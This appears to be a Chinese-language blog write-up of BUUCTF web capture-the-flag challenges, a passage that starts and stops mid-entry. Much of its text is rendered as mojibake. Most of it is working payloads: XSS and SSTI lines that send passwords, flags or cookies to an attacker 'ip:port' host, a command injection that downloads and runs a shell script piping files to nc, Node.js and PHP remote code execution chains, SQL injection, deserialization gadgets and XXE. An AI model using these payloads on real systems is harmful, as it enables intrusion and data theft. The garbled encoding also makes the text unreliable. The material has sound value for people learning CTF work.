ä¸­æœ‰æ³¨é‡Šï¼Œå°†è®¸å¤šå…³é”®å­—æ›¿æ¢ä¸ºç©ºï¼Œè¿™ä¸ªå¯ä»¥æ‹¼æ¥ç»•è¿‡ï¼Œæœ€ä¸»è¦çš„å‘æ˜¯æ²¡æœ‰æç¤ºbotä¼šå¡«è¡¨å•ã€‚ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªè¡¨å•ç»™botå¡«å†™ï¼Œç„¶åè·³è½¬åˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨å³å¯ï¼Œå¯†ç å°±æ˜¯flagã€‚ 1234567&lt;incookieput type=\"text\" name=\"username\"&gt;&lt;incookieput type=\"password\" name=\"password\"&gt;&lt;scrcookieipt scookierc=\"./js/login.js\"&gt;&lt;/scrcookieipt&gt;&lt;scrcookieipt&gt; var psw = docucookiement.getcookieElementsByName&amp;#40;\"password\"&amp;#41;[0].value; docucookiement.locacookietion=\"http://ip:port/?a=\"+psw;&lt;/scrcookieipt&gt; [MRCTF2020]Ezauditä¸‹è½½æºç ï¼Œæ˜¯ä¸€é“ä¼ªéšæœºæ•°çˆ†ç ´ï¼Œå‘Šè¯‰äº†æˆ‘ä»¬å‰16ä½ä¸ºKVQP0LdJKRaV3n9Dï¼Œä½¿ç”¨php_mt_seedå·¥å…·çˆ†ç ´éšæœºæ•°ç§å­ä¸º:1775196155ã€‚ 1username=1&amp;password=&apos;or 1=1#&amp;Private_key=XuNhoueCDCGc&amp;login=1 [NPUCTF2020]éªŒè¯ğŸå®¡è®¡ä»£ç  1first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5&amp;#40;first+keys[0]&amp;#41; === md5&amp;#40;second+keys[0]&amp;#41; åœ¨jsä¸­ï¼Œä½¿ç”¨+è¿ç®—ç¬¦æ—¶ä¼šå°†ä¸æ˜¯å­—ç¬¦ä¸²ç±»å‹çš„æ•°æ®è½¬æ¢æˆå­—ç¬¦ä¸²ç±»å‹ã€‚å¦‚æœæ˜¯æ•°ç»„çš„è¯ï¼Œä¼šé¦–å…ˆè°ƒç”¨æ•°ç»„ç±»å‹valueofæ–¹æ³•å†æ‰§è¡ŒtoStringæ–¹æ³•ï¼Œå°†æ•°ç»„è½¬æ¢ä¸ºå­—ç¬¦ä¸²ç±»å‹ï¼Œå€¼ä¸ºæ•°ç»„ä¸­çš„å€¼ï¼Œå› ä¸ºè¦ä¼ é€’å¯¹è±¡ï¼Œæ‰€ä»¥ç”¨jsonä¼ å€¼ã€‚ 1&amp;#123;&quot;e&quot;:&quot;1&quot;,&quot;first&quot;:&quot;1&quot;,&quot;second&quot;:[1]&amp;#125; æ¥ä¸‹æ¥å°±æ˜¯ç»•è¿‡æ­£åˆ™ï¼Œçœ‹ä¸€ä¸‹æ­£åˆ™è¡¨è¾¾å¼ï¼ŒåŒ¹é…çš„æ˜¯math.******è¿™æ ·çš„å­—ç¬¦ä¸²æˆ–è€…å­—ä¸²ï¼Œ***ä¸­åªèƒ½å«æœ‰æ•°å­—å’Œä¸€äº›å­—ç¬¦ã€‚ 1&amp;#40;?:Math&amp;#40;?:\\.\\w+&amp;#41;?&amp;#41;|[&amp;#40;&amp;#41;+\\-*/&amp;|^%&lt;&gt;=,?:]|&amp;#40;?:\\d+\\.?\\d*&amp;#40;?:e\\d+&amp;#41;?&amp;#41; å¯ä»¥ç”¨çš„å­—ç¬¦ä¸²åªæœ‰ä¸€ä¸ªMathï¼Œæ°å¥½ï¼Œjsä¸­å¯ä»¥å®šä¹‰åŒ¿åå‡½æ•°ï¼Œæ ¼å¼æ˜¯å‚æ•°å=&gt;&amp;#40;å‡½æ•°å®ä½“&amp;#41;åˆšå¥½æ»¡è¶³æ­£åˆ™è¡¨è¾¾å¼ï¼Œæƒ³è¦æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œé¦–å…ˆè¦è·å–processå¯¹è±¡ï¼Œä½†æ˜¯æƒ³è¦æ­£åˆ™è¡¨è¾¾å¼ï¼Œåªèƒ½é å­—ç¬¦ä¸²å¯¹è±¡çš„StringCharCodeæ–¹æ³•ï¼Œæ‰€ä»¥é¦–å…ˆè¦å¾—åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡ï¼Œé¦–å…ˆMathæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œä¹‹å‰è¯´è¿‡+å†å­—ç¬¦ä¸²æ‹¼æ¥æ—¶ä¼šå°†å¯¹è±¡ç±»å‹å¼ºåˆ¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²ç±»å‹ï¼Œæ‰€ä»¥å¯ä»¥ä¼ å…¥å‚æ•°Math+1è¿™ç§æ–¹æ³•æ¥è·å¾—å­—ç¬¦ä¸²å¯¹è±¡ï¼Œç”±äºè¿‡æ»¤äº†;å·ï¼Œä½¿ç”¨é€—å·ä½œä¸ºè¯­å¥åˆ†éš”ã€‚ 12&amp;#40;Math=&gt;&amp;#40;Math=Math.constructor;Math.x=Math.constructor&amp;#40;Math.fromCharCode&amp;#40;114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41&amp;#41;&amp;#41;&amp;#40;&amp;#41;&amp;#41;&amp;#41;&amp;#40;Math+1&amp;#41; StringCharCodeè§£æå®Œä¹‹åæ˜¯ï¼š 1return process.mainModule.require&amp;#40;'child_process'&amp;#41;.execSync&amp;#40;'cat /flag'&amp;#41;.toString&amp;#40;&amp;#41; æˆåŠŸè·å¾—flagã€‚ [GWCTF 2019]ä½ çš„åå­—F12å‘ç°Djangoï¼Œæ¨¡æ¿æ³¨å…¥ï¼Œè¿‡æ»¤äº†&#123;&#123;&#125;&#125;ä½¿ç”¨&#123;% if â€¦ %&#125;&#123;% endif %&#125;ç»•è¿‡ï¼Œä½†æ˜¯å¾ˆå¤šå…³é”®å­—è¢«è¿‡æ»¤äº†ï¼Œçœ‹äº†ä¸€ä¸‹åˆ«çš„å¸ˆå‚…WPï¼Œå‘ç°æ—¶é»‘åå•é€»è¾‘é—®é¢˜&#40;å‘ï¼Œä¸ç»™æºç &#41; 12345678910blacklist = ['import', 'getattr', 'os', 'class', 'subclasses', 'mro', 'request', 'args', 'eval', 'if', 'for', ' subprocess', 'file', 'open', 'popen', 'builtins', 'compile', 'execfile', 'from_pyfile', 'local', 'self', 'item', 'getitem', 'getattribute', 'func_globals', 'config']for no in blacklist: while True: if no in s: s = s.replace&amp;#40;no, ''&amp;#41; else: breakreturn s å¯ä»¥è¿™æ ·ç»•è¿‡ï¼Œimposortï¼Œåªè¦è¢«æ›¿æ¢ä¸ºç©ºçš„å€¼å†è‡ªèº«çš„å‰é¢å°±å¯ä»¥ï¼Œä½†æ˜¯æœ€å¥½ç”¨çš„è¿˜æ˜¯æœ€åä¸€é¡¹configï¼Œå› ä¸ºå®ƒåœ¨æ‰€æœ‰é»‘åå•çš„åé¢ã€‚ 1&amp;#123;% iconfigf &apos;&apos;.__claconfigss__.__mconfigro__[2].__subclaconfigsses__&amp;#40;&amp;#41;[59].__init__.func_glconfigobals.lineconfigcache.oconfigs.popconfigen&amp;#40;&apos;curl http://ip:port/ -d `cat /flag_1s_Hera`;&apos;&amp;#41; %&amp;#125;1&amp;#123;% endiconfigf %&amp;#125; [NESTCTF 2019]Love Math 2é•¿åº¦è¢«é™åˆ¶ï¼Œä¸å¯è§å­—ç¬¦ä¹Ÿè¢«é™åˆ¶äº†ï¼Œæ‰€ä»¥åªèƒ½ç”¨äº¦æˆ–æ‹¼å‡‘å¤„$_GET $pi=&amp;#40;is_nan^&amp;#40;6&amp;#41;.&amp;#40;4&amp;#41;&amp;#41;.&amp;#40;tan^&amp;#40;1&amp;#41;.&amp;#40;5&amp;#41;&amp;#41;; payload: 1c=$pi=&amp;#40;is_nan^&amp;#40;6&amp;#41;.&amp;#40;4&amp;#41;&amp;#41;.&amp;#40;tan^&amp;#40;1&amp;#41;.&amp;#40;5&amp;#41;&amp;#41;;$pi=$$pi;$pi&amp;#123;0&amp;#125;&amp;#40;$pi&amp;#123;1&amp;#125;&amp;#41;&amp;0=system&amp;1=cat%20/flag [b01lers2020]Life on Marséšä¾¿ç‚¹ç‚¹å‘ç°ä¸€ä¸ªæ¥å£ï¼Œç–‘ä¼¼sqlæ³¨å…¥ï¼Œè¯•äº†ä¸€ä¸‹æœç„¶æ˜¯è”åˆæ³¨å…¥ï¼Œæ‰«è¡ä»¥ä¸‹è¡¨å 1/query?search=olympus_mons%20union%20select%20&amp;#40;select group_concat&amp;#40;table_name&amp;#41; from information_schema.tables where table_schema=database&amp;#40;&amp;#41;&amp;#41;,222&amp;&amp;#123;&amp;#125;&amp;_=1604822267806 æ²¡å‘ç°å¯ä»¥çš„è¡¨ï¼Œæ‰«è¡ä¸€ä¸‹åº“å 1/query?search=olympus_mons%20union%20select%20&amp;#40;select group_concat&amp;#40;schema_name&amp;#41; from information_schema.schemata&amp;#41;,222&amp;&amp;#123;&amp;#125;&amp;_=1604822267806 å‘ç°alien_codeåº“ï¼Œé‡Œé¢æœ‰codeå­—æ®µï¼Œæ˜¯flagã€‚ 1/query?search=olympus_mons%20union%20select%20&amp;#40;select code from alien_code.code&amp;#41;,222&amp;&amp;#123;&amp;#125;&amp;_=1604822267806 [GXYCTF2019]BabysqliV3.0å¼±å¯†ç admin/passwordåŠ å…¥åå°ï¼Œè¯»å–ä¸€ä¸‹æºç  1?file=php://filter/convert.base64-encode/resource=home å‘ç°åªå…è®¸ä»¥uploadã€homeç»“å°¾æ‰å¯ä»¥è¯»å–ï¼Œå®¡è®¡ä»¥ä¸‹upload.phpï¼Œå‘ç°å­˜åœ¨pharååºåˆ—åŒ–æ¼æ´ï¼Œé¦–å…ˆéšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œè·å–æ–‡ä»¶è·¯å¾„å’Œ$_session[user]ã€‚ ![image-20201108172108685]&#40;G:\\MyBlog\\source\\images\\BUUCTF3\\image-20201108172108685.png&#41; 123456789101112131415161718192021&lt;?phpclass Uploader&amp;#123; public $Filename; public $cmd; public $token; function __construct&amp;#40;&amp;#41;&amp;#123; $this-&gt;token=\"GXY33ab688d4f7951f53ff12e76befb21a9\"; $this-&gt;cmd=\"highlight_file&amp;#40;'/var/www/html/flag.php'&amp;#41;;\"; $this-&gt;Filename=\"1\"; &amp;#125;&amp;#125;$a=new Uploader&amp;#40;&amp;#41;;$phar = new Phar&amp;#40;\"phar.phar\"&amp;#41;;$phar-&gt;startBuffering&amp;#40;&amp;#41;;$phar-&gt;setStub&amp;#40;\"&lt;?php __HALT_COMPILER&amp;#40;&amp;#41;; ?&gt;\"&amp;#41;; //è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´ç”¨ä»¥æ¬ºéª—æ£€æµ‹$phar-&gt;setMetadata&amp;#40;$a&amp;#41;; //å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest$phar-&gt;addFromString&amp;#40;\"test.txt\", \"test\"&amp;#41;; //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶$phar-&gt;stopBuffering&amp;#40;&amp;#41;;?&gt; ç”Ÿæˆpharæ–‡ä»¶ï¼Œä¸Šä¼ pharæ–‡ä»¶ã€‚ ç”±äºæˆ‘ä»¬è¦åœ¨åœ¨file_get_contentså¤„è§¦å‘ååºåˆ—åŒ–ï¼Œæ‰€ä»¥æˆ‘ä»¬ç»§ç»­éšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¼ å…¥nameå‚æ•° 1phar://ä¹‹å‰è·å–çš„æ–‡ä»¶è·¯å¾„ å³å¯è§¦å‘ååºåˆ—åŒ–æ¼æ´ã€‚ [GYCTF2020]Ez_Expressæ‰“å¼€æºç å°±æ˜¯ä¸€ä¸ªæ˜æ˜¾çš„mergeå‡½æ•°çš„åŸå‹é“¾æ±¡æŸ“ï¼Œæ³¨å†Œçš„æ—¶å€™ç”¨äº†toUpperCaseå‡½æ•°ï¼Œåœ¨toUpperCase&#40;&#41;å‡½æ•°ä¸­ï¼Œå­—ç¬¦Ä±ä¼šè½¬å˜ä¸ºIï¼Œæ‰€ä»¥ç›´æ¥æ³¨å†Œä¸€ä¸ªADÄ±INå°±è‡ªåŠ¨å˜æˆäº†ADMINï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°infoè·¯ç”±ä¸­è¿”å›äº†ä¸€ä¸ªoutputFunctionNameï¼Œæ˜¯æ²¡æœ‰è¢«å®šä¹‰è¿‡çš„ï¼Œåœ¨çœ‹åˆ°ejsæ¨¡æ¿ä¸­çš„&lt;%=user%&gt;ï¼Œé‚£å°±æ˜¯æ±¡æŸ“outputFunctionNameï¼Œè®©ejsæ¨¡æ¿æ‰§è¡Œjavascriptä»£ç RCEã€‚ 123&amp;#123;&quot;test&quot;:&quot;1&quot;,&quot;__proto__&quot;:&amp;#123;&quot;outputFunctionName&quot;:&quot;a=1;return global.process.mainModule.require&amp;#40;&apos;child_process&apos;&amp;#41;.execSync&amp;#40;&apos;cat /flag&apos;&amp;#41;.toString&amp;#40;&amp;#41;//&quot;&amp;#125;&amp;#125;;return global[process].mainModule.require&amp;#40;&apos;child_process&apos;&amp;#41;.execSync&amp;#40;&apos;cat /flag&apos;&amp;#41;.toString&amp;#40;&amp;#41;// [GKCTF2020]EZä¸‰å‰‘å®¢-EzTypechoè€ƒç‚¹æ˜¯Typechoååºåˆ—åŒ–æ¼æ´ï¼Œå®¡è®¡ä¸€ä¸‹ä»£ç ï¼Œåœ¨install.phpä¸­æ‰¾åˆ°äº†ä¸¤å¤„ååºåˆ—åŒ–ç‚¹ã€‚ ![image-20201110115041051]&#40;G:\\MyBlog\\source\\images\\BUUCTF3\\image-20201110115041051.png&#41; è¿™ä¸€å¤„å› ä¸ºæ²¡æœ‰sessionï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨ï¼Œåªèƒ½çœ‹ç¬¬äºŒå¤„ã€‚ ![image-20201110115110344]&#40;G:\\MyBlog\\source\\images\\BUUCTF3\\image-20201110115110344.png&#41; è§¦å‘æ¡ä»¶æ˜¯å­˜åœ¨GET startå‚æ•°ï¼Œå°†cookie[â€˜__typecho_configâ€™]ååºåˆ—åŒ–ï¼Œä½†æ˜¯æƒ³åˆ°è¾¾è¿™é‡Œè¿˜éœ€è¦è¿‡ä¸€å¤„Refferæ£€éªŒã€‚ ![image-20201110115234196]&#40;G:\\MyBlog\\source\\images\\BUUCTF3\\image-20201110115234196.png&#41; å°†Reffereå¤´è®¾ç½®ä¸ºåŒç«™å³å¯ç»•è¿‡ï¼Œé“¾å­å¾ˆç®€å•ï¼Œæ„Ÿå…´è¶£å¯ä»¥è‡ªå·±æŒ–ï¼Œåç»­ä¼šåœ¨æˆ‘çš„åšå®¢ä»£ç å®¡è®¡ä¸“é¢˜ä¸­è¯¦ç»†ä»‹ç»Typechoååºåˆ—åŒ–æ¼æ´ã€‚ poc: 1234567891011121314151617181920212223242526272829&lt;?phpclass Typecho_Feed&amp;#123; private $_type; private $_items = array&amp;#40;&amp;#41;; public function __Construct&amp;#40;&amp;#41;&amp;#123; $this-&gt;_type='RSS 2.0'; $this-&gt;_items['author']=array&amp;#40;\"author\"=&gt;new Typecho_Request&amp;#40;&amp;#41;&amp;#41;; &amp;#125;&amp;#125;class Typecho_Request&amp;#123; private $_params = array&amp;#40;&amp;#41;; private $_filter; public function __Construct&amp;#40;&amp;#41;&amp;#123; $this-&gt;_params['screenName']='cat /flag'; $this-&gt;_filter=['system']; $this-&gt;link=\"1\"; $this-&gt;title=\"2\"; &amp;#125;&amp;#125;$a=array&amp;#40;&amp;#41;;$a['adapter']=new Typecho_Feed&amp;#40;&amp;#41;;$a=serialize&amp;#40;$a&amp;#41;;$b=base64_encode&amp;#40;$a&amp;#41;;echo $b; [ç¬¬ä¸€ç«  webå…¥é—¨]afr_31/article?name=article åœ¨nameå¤„å¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–ï¼Œä¸è¿‡æ²¡æœ‰æƒé™è¯»å–flagï¼Œå°è¯•è¯»å–æºç ï¼Œè¯»å–/proc/self/cmdlineå‘ç°å­˜åœ¨server.pyï¼Œä½†æ˜¯ä¸çŸ¥é“å½“å‰ç›®å½•è·¯å¾„ï¼Œå¯ä»¥é€šè¿‡/proc/self/cmdè·å¾—å½“å‰è·¯å¾„ã€‚ 1/article?name=../../../../proc/self/cmd/server.py è¯»åˆ°æºç ï¼Œå‘ç°å­˜åœ¨key.pyï¼Œè®¾ç½®äº†secretkey=keyï¼Œè¯»å–ä¸€æ³¢secretkey 1key = &apos;Drmhze6EPcv0fN_81Bj-nA&apos; åœ¨æºç ä¸­å‘ç°å¯ä»¥æ§åˆ¶sessionä¸­n1codeçš„å€¼æ¥è¿›è¡Œæ¨¡æ¿æ³¨å…¥ï¼Œæˆ‘ä»¬ä¹Ÿå¾—åˆ°äº†secretkeyã€‚ 123if session[&apos;n1code&apos;] is not None: template = &apos;&apos;&apos;&amp;lt;h1&amp;gt;N1 Page&amp;lt;/h1&amp;gt; &amp;lt;div class=&quot;row&amp;gt; &amp;lt;div class=&quot;col-md-6 col-md-offset-3 center&quot;&amp;gt; Hello : %s, why you don&apos;t look at our &amp;lt;a href=&apos;/article?name=article&apos;&amp;gt;article&amp;lt;/a&amp;gt;? &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &apos;&apos;&apos; % session[&apos;n1code&apos;] session[&apos;n1code&apos;] = None ç›´æ¥ä¼ªé€ sessionï¼Œè¯»å–flag.pyã€‚ 1&amp;#123;&apos;n1code&apos;: &apos;&amp;#123;&amp;#123;[].__class__.__base__.__subclasses__&amp;#40;&amp;#41;[40]&amp;#40;\\&apos;./flag.py\\&apos;&amp;#41;.read&amp;#40;&amp;#41;&amp;#125;&amp;#125;&apos;&amp;#125; [HFCTF2020]BabyUploadèµ¤è£¸è£¸çš„sessionä¼ªé€ ï¼Œæœ‰ä¸‹è½½è·¯ç”±ï¼Œé‚£å°±ä¸‹è½½çœ‹çœ‹sessionç”¨çš„ä»€ä¹ˆå¼•æ“å¤„ç†sessionã€‚ ![image-20201112143845534]&#40;G:\\MyBlog\\source\\images\\BUUCTF3\\image-20201112143845534.png&#41; å‘ç°æ˜¯ç”¨çš„php_binaryå¼•æ“ï¼Œé‚£å°±ç”¨è¯¥å¼•æ“ç”Ÿæˆä¸€ä¸ªusername=adminçš„sessionã€‚ é¢˜ç›®ä¸­çš„æ–‡ä»¶åæ ¼å¼æ˜¯é¦–å…ˆæ‹¼æ¥æ–‡ä»¶åï¼Œç„¶åæ‹¼æ¥_+hash_fileï¼Œé‚£ä¹ˆæˆ‘ä»¬è®©æ–‡ä»¶åä¸ºsess,è®¡ç®—ä¸€ä¸‹hash_fileå³å¯å¾—åˆ°æ–‡ä»¶åã€‚ ä¸Šä¼ åä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨/var/babyctf/success.txtï¼Œä½¿ç”¨çš„æ˜¯file_existså‡½æ•°ï¼Œä½†æ˜¯è¯¥å‡½æ•°çš„ä½œç”¨æ˜¯æ£€æµ‹å‡½æ•°æˆ–è€…ç›®å½•æ˜¯å¦å­˜åœ¨ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªsuccess.txtç›®å½•æ¥ç»•è¿‡ï¼Œé‚£ä¹ˆå°±è®©attr=success.txtï¼Œéšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶å³å¯ç»•è¿‡ã€‚ [HarekazeCTF2019]Avatar Uploader 1é¢˜ç›®ç»™å‡ºæºç ï¼Œè¦æ»¡è¶³finfo_fileåˆ¤æ–­ä¸ºpngï¼ŒåŒæ—¶getimagesizeåˆ¤æ–­ä¸ä¸ºpngã€‚ ![image-20201112151849282]&#40;G:\\MyBlog\\source\\images\\BUUCTF3\\image-20201112151849282.png&#41; ä¸Šä¼ ä¸€å¼ è¿™æ ·çš„å›¾ç‰‡å³å¯ç»•è¿‡ã€‚ [ç¬¬äºŒç«  webè¿›é˜¶]æ­»äº¡pingå‘½ä»¤é¦–å…ˆfuzzä¸€ä¸‹è¿‡æ»¤äº†å•¥ï¼Œå‘ç°èƒ½ç”¨çš„å­—ç¬¦åªæœ‰&lt;&gt;/ï¼Œä½†æ˜¯è¿™äº›å°±å¤Ÿäº†ï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦ä¸€ä¸ªå‘½ä»¤åˆ†éš”ç¬¦ï¼Œ%0aåˆšå¥½æ»¡è¶³æ¡ä»¶ ![image-20201119155659182]&#40;G:\\MyBlog\\source\\images\\BUUCTF3\\image-20201119155659182.png&#41; å‘ç°æˆåŠŸæ‰§è¡Œlså‘½ä»¤ï¼Œä½†æ˜¯å´æ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥åªèƒ½æƒ³åŠæ³•å°†ç»“æœå¸¦å‡ºæ¥ï¼Œå¯ä»¥çœ‹åˆ°&gt;å¯ä»¥ä½¿ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨curlå‘½ä»¤è¿œç¨‹ä¸‹è½½ä¸€ä¸ªshæ–‡ä»¶ï¼Œç„¶ååœ¨æœ¬åœ°æ‰§è¡Œï¼Œåœ¨æˆ‘ä»¬çš„æœåŠ¡å™¨webç›®å½•ä¸‹æ”¾ç½®ä¸€ä¸ª1.shï¼Œå†…å®¹å¦‚ä¸‹ï¼š 1cat /F* |nc ip port ç„¶åæäº¤ 1ip=127.0.0.1%0acurl ip/1.sh &gt; /tmp/1.sh ä¿®æ”¹ä¸€ä¸‹/tmp/1.shæƒé™ï¼Œä½¿å¾—å®ƒå¯ä»¥æ‰§è¡Œ 1ip=127.0.0.1%0achmod 777 /tmp/1.sh æœ€ååœ¨æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸Šç›‘å¬ç«¯å£ 1nc -lvvp ip port æäº¤ 1ip=127.0.0.1%0ash /tmp/1.sh å³å¯å¸¦å‡ºflag [SWPU2019]Web3æ‰“å¼€é¢˜ç›®ï¼Œè®¿é—®uploadè·¯ç”±å‘ç°æƒé™ä¸å¤Ÿï¼Œhtmlé¡µé¢æœ‰ä¸ª404ï¼Œå‘ç°è®¿é—®åˆ°ä¸å­˜åœ¨è·¯ç”±æ—¶ï¼Œä¼šåœ¨è¯·æ±‚å¤´ä¸­è¿”å›cookieå€¼ï¼Œé‡Œé¢æœ‰secretkeyï¼Œå¯ä»¥é€šè¿‡ä¼ªé€ cookie id=1,è¿›å…¥uploadè·¯ç”±ï¼Œåœ¨htmlä»£ç ä¸­å¾—åˆ°æºç ï¼Œå‘ç°åœ¨ä¸Šä¼ å‹ç¼©åŒ…åï¼Œå¯¹å‹ç¼©åŒ…è¿›è¡Œè§£å‹ç¼©ï¼Œç„¶åæ‰“å¼€å‹ç¼©åŒ…ä¸­çš„æ–‡ä»¶ï¼Œåœ¨showflagè·¯ç”±ä¸­å¯ä»¥çœ‹åˆ°flagæ–‡ä»¶åœ¨flaskç›®å½•ä¸‹çš„flag/flag.jpgä¸­ï¼ŒæŸ¥çœ‹å¸ˆå‚…ä»¬çš„WPå‘ç°ï¼Œè¿™é‡Œå¯ä»¥ç”¨è½¯é“¾æ¥åˆ›å»ºå‹ç¼©åŒ…ï¼Œç„¶åè®©ç¨‹åºå»æ‰“å¼€è½¯é“¾æ¥ï¼Œå°±ä¼šè‡ªåŠ¨å®šä½åˆ°flag.jpgã€‚ æ‰§è¡Œä¸‹é¢çš„ç›®å½•ï¼Œå»ºç«‹ä¸€ä¸ªæŒ‡å‘flag.jpgçš„è½¯è·¯ç”±testï¼Œ/proc/self/cwdä¸ºå½“å‰ç›®å½•ã€‚ 1ln -s /proc/self/cwd/flag/flag.jpg test ç„¶åä½¿ç”¨å‹ç¼©ç›®å½•å°†ä»–å‹ç¼©ä¸ºå‹ç¼©åŒ…ï¼Œä¸Šä¼ æ–‡ä»¶ï¼ŒæŠ“åŒ…å¾—åˆ°flagã€‚ 1zip -ry test.zip test ![image-20201123204354248]&#40;G:\\MyBlog\\source\\images\\BUUCTF3\\image-20201123204354248.png&#41; [BSidesCF 2019]SVGMagicä¸€ä¸ªSVGçš„XXEï¼Œæäº¤ä¸‹é¢çš„SVGï¼Œå°±èƒ½çœ‹åˆ°flagï¼Œflagåœ¨å½“å‰ç›®å½•çš„flag.txtä¸­ã€‚ 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE svg [&lt;!ENTITY file SYSTEM &quot;file:///proc/self/cwd/flag.txt&quot;&gt; ]&gt; &lt;svg height=&quot;100&quot; width=&quot;1000&quot;&gt; &lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;&amp;file;&lt;/text&gt;&lt;/svg&gt; ![image-20201123210124396]&#40;G:\\MyBlog\\source\\images\\BUUCTF3\\image-20201123210124396.png&#41; [æŸå…¥ç¾¤é¢˜]Web2ç™»å½•ä½¿ç”¨with rollupæ„é€ tokenä¸ºç©ºç»•è¿‡åˆ¤å®šã€‚ 1username=admin\\&amp;password=||1 group by token with rollup limit 1 offset 2 ; --+&amp;question=1 è¿›å…¥åå°ï¼Œå‘ç°ä¸€ä¸ªæ•°æ®åº“è¿æ¥çš„ä¸œä¸œï¼Œåº”è¯¥æ˜¯mysqlæœåŠ¡ç«¯ä¼ªé€ äº†ï¼ŒåŸç†å’ŒRedisæœåŠ¡ç«¯ä¼ªé€ ä¸€æ ·çš„ï¼ŒmysqlæœåŠ¡ç«¯ä¼ªé€ ä¸»è¦æ˜¯ä½¿ç”¨load data local infileè¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–ï¼Œä½†æ˜¯ç°åœ¨ä¸çŸ¥é“flagçš„ä½ç½®ã€‚ åœ¨json.phpä¸­å‘ç°ï¼Œä¼šåˆ—å‡ºnameå‚æ•°çš„ç›®å½• ![image-20201128000425882]&#40;G:\\MyBlog\\source\\images\\BUUCTF3\\image-20201128000425882.png&#41; ä½†æ˜¯åœ¨åå°ç‚¹å¼€æ–‡ä»¶ï¼Œè·¯å¾„å´æ˜¯WebShellå¤§é©¬/webshell/,åº”è¯¥æ˜¯æ‹¼æ¥äº†webshellã€‚ ![image-20201128000510021]&#40;G:\\MyBlog\\source\\images\\BUUCTF3\\image-20201128000510021.png&#41; é€šè¿‡è®¿é—®å¤´çœ‹åˆ°ï¼ŒPHPä¸º5.2.17,è¿™ä¸ªç‰ˆæœ¬å­˜åœ¨ä¸€ä¸ª%00å­—ç¬¦ä¸²æˆªæ–­çš„é—®é¢˜ã€‚ ![image-20201128000241825]&#40;G:\\MyBlog\\source\\images\\BUUCTF3\\image-20201128000241825.png&#41; æ‰€ä»¥åœ¨json.phpä¸­å¯ä»¥è¿›è¡Œç›®å½•ç©¿è¶Šï¼Œå¹¶ç”¨%00æˆªæ–­æ‹¼æ¥çš„webshellï¼Œè¯»å–åˆ°è·¯å¾„ï¼Œå¾—åˆ°flagã€‚ 1/admin/page/json.php?dt=alldata&amp;name=Webshellå¤§é©¬/../../../../../../%00&amp;page=1&amp;limit=15 [GoogleCTF2019 Quals]BnvæŠ“åŒ…æäº¤å‘ç°æ˜¯ä»¥jsonçš„æ•°æ®æ ¼å¼å‘é€è‡³æœåŠ¡å™¨è§£æï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹Content-Type=application/xmlï¼Œä½¿æœåŠ¡å™¨è§£æXMLæ ¼å¼çš„æ•°æ®ï¼Œæ‰€ä»¥è¿™é‡Œè€ƒç‚¹å°±æ˜¯ä¸€ä¸ªç›²æ³¨çš„XXEï¼Œpayload 1234567891011&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [ &lt;!ELEMENT message ANY&gt; &lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt; &lt;!ENTITY % para &apos; &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt; &amp;#x25;para2; &apos;&gt; %para;]&gt;&lt;message&gt;1&lt;/message&gt; [CISCN2019 åä¸œåŒ—èµ›åŒº]Web2ä¸€ä¸ªxssï¼Œè¿‡æ»¤äº†ç­‰äºå·æ‹¬å·ä¹‹ç±»çš„ï¼Œéœ€è¦å°†å†…å®¹htmlç¼–ç ï¼Œæ‹¿å‡ºpayload 1&lt;svg&gt;&lt;script&gt;eval&amp;#40;&amp;#34;&amp;#119;&amp;#105;&amp;#110;&amp;#100;&amp;#111;&amp;#119;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#46;&amp;#104;&amp;#114;&amp;#101;&amp;#102;&amp;#61;&amp;#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#56;&amp;#46;&amp;#49;&amp;#50;&amp;#57;&amp;#46;&amp;#54;&amp;#57;&amp;#46;&amp;#56;&amp;#53;&amp;#58;&amp;#50;&amp;#51;&amp;#51;&amp;#51;&amp;#63;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&amp;#61;&amp;#39;&amp;#43;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&